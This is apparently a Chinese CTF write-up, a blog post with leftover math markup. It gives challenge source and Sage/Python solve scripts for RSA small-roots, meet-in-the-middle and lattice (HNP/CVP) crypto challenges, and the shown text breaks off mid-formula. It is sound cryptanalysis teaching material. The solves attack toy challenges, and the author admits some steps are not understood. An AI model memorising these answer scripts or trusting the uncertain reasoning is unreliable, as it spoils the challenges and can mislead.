class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.999108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.999108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>同时呢，<code>m</code>肯定是比<code>n1,n2</code>小的，看完<code>exp</code>，怎么说呢，有点似懂非懂(我这里写的思路也不一定对哦)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = </span><br><span class="line">phi = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">s = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x-s</span><br><span class="line">res = f.small_roots(x=<span class="number">2</span>^<span class="number">2048</span>,beta = <span class="number">0.4</span>, epsilon = <span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id="mimt_rsa"><a class="markdownIt-Anchor" href="#mimt_rsa"></a> MIMT_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY， flag  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">ck = <span class="built_in">pow</span>(KEY, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ck = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">ck = 8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>中间相遇攻击</strong>，原理不难，36位的非素数，随便测了几个数字，大致可以分解为18和20位的两个数字</p><p>参考<a href="https://tangcuxiaojikuai.xyz/post/601c0957.html">https://tangcuxiaojikuai.xyz/post/601c0957.html</a>，<strong>NCTF2021-rsa</strong>，这题还是挺有意思的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line">S = &#123;<span class="built_in">pow</span>(i,-e,n):i <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">20</span>))&#125;</span><br><span class="line">inv_ck = inverse(ck,n)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    s = inv_ck*(<span class="built_in">pow</span>(j,e,n))%n</span><br><span class="line">    <span class="keyword">if</span>(s <span class="keyword">in</span> S):</span><br><span class="line">        secret = S[s]*j</span><br><span class="line">        flag = <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="baby_lattice"><a class="markdownIt-Anchor" href="#baby_lattice"></a> baby_lattice</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">miku = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">key = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> key&gt; p:</span><br><span class="line">    key= getPrime(<span class="number">512</span>)</span><br><span class="line">ts = []</span><br><span class="line">gs = []</span><br><span class="line">zs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(miku):</span><br><span class="line">    t = getPrime(<span class="number">512</span>)</span><br><span class="line">    z = getPrime(<span class="number">400</span>)</span><br><span class="line">    g= (t * key + z) % p</span><br><span class="line">    ts.append(t)</span><br><span class="line">    gs.append(g)</span><br><span class="line">    zs.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ts = <span class="subst">&#123;ts&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gs = <span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">iv= os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">ciphertext=cipher.encrypt(pad(flag.encode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;iv=<span class="subst">&#123;iv&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ciphertext=<span class="subst">&#123;ciphertext&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下面参考的是<strong>小鸡块师傅</strong>的<strong>CVP</strong>做法，<a href="https://tangcuxiaojikuai.xyz/post/6a2afd81.html">https://tangcuxiaojikuai.xyz/post/6a2afd81.html</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">ts = [<span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>, <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>, <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>, <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>, <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>, <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>, <span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>, <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>, <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>, <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>, <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>, <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>, <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>, <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>, <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>, <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>, <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>, <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>, <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>, <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>, <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>, <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>, <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>, <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>, <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>, <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>, <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>, <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>, <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>, <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>]</span><br><span class="line">gs = [<span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>, <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>, <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>, <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>, <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>, <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>, <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>, <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>, <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>, <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>, <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>, <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>, <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>, <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>, <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>, <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>, <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>, <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>, <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>, <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>, <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>, <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>, <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>, <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>, <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>, <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>, <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>, <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>, <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>, <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>]</span><br><span class="line">iv = <span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line">rs = ts</span><br><span class="line">cs = gs</span><br><span class="line"></span><br><span class="line">G=GF(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">  small = target</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">      c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">      small -= M[i] * c</span><br><span class="line">  <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">A = matrix(ZZ, m+n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = p</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[m , x] = rs[x]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, cs)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line">R = IntegerModRing(p)</span><br><span class="line">M = Matrix(R, rs)</span><br><span class="line">res=vector(R, res)</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(cs,res):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i-j))-<span class="number">2</span>==<span class="number">400</span></span><br><span class="line">key=((res[<span class="number">0</span>])*inverse(rs[<span class="number">0</span>],p)) %p</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">flag = cipher.decrypt(ciphertex)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>奇怪的是，我<code>HNP</code>构造的格出不来，我感觉已经是配平了的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">M = Matrix(ZZ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p * k</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i] * k</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i] * k</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span>^<span class="number">512</span></span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">2</span>^<span class="number">512</span>:</span><br><span class="line">        <span class="built_in">print</span>(i[-<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>然后，翻了一下别的师傅的<code>wp</code>(在下面)，发现，这里规约出来的都是<strong>p-key</strong>？？？人傻了，这是什么原理？看了一下出题人自己的<a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">wp</a>，好像并没有这个问题<br /><img src="https://pic1.zhimg.com/80/v2-e74d7d58b38938f539b9cf92783a11cf_1440w.png" alt="" /><br />会这样的吗，不理解，那就下次记住吧(???)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">L = Matrix(QQ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^<span class="number">400</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i]</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i]</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = k/p</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = k</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == k:</span><br><span class="line">        key = p-(<span class="built_in">abs</span>(i[-<span class="number">2</span>].numerator())/k)</span><br></pre></td></tr></table></figure><h2 id="ez_fermat_bag_pro"><a class="markdownIt-Anchor" href="#ez_fermat_bag_pro"></a> EZ_Fermat_bag_Pro</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">88</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">f = P(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p,q),n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">str</span>(p)))) <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>:])</span><br><span class="line">c = bytes_to_long(flag) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line"><span class="string">f = x^31 - x^30*y - 2*x^29*y^2 + 7*x^28*y^3 + 2*x^27*y^4 - 4*x^24*y^7 + 3*x^23*y^8 - x^20*y^11 - 4*x^19*y^12 + x^18*y^13 - 5*x^17*y^14 - 4*x^16*y^15 - x^15*y^16 + x^14*y^17 + x^13*y^18 + x^12*y^19 - 2*x^11*y^20 - 3*x^9*y^22 + 5*x^7*y^24 + x^6*y^25 + 6*x^4*y^27 + x^3*y^28 + 2*x*y^30 + y^31 - 2*x^30 - 3*x^29*y + 2*x^28*y^2 + 2*x^27*y^3 - x^26*y^4 - x^25*y^5 - 2*x^24*y^6 - 3*x^23*y^7 - 3*x^22*y^8 - 3*x^20*y^10 - 4*x^19*y^11 + 2*x^18*y^12 + x^15*y^15 - x^14*y^16 - 2*x^12*y^18 - 3*x^11*y^19 - x^10*y^20 + x^9*y^21 + 2*x^8*y^22 + x^7*y^23 + x^5*y^25 - x^4*y^26 - 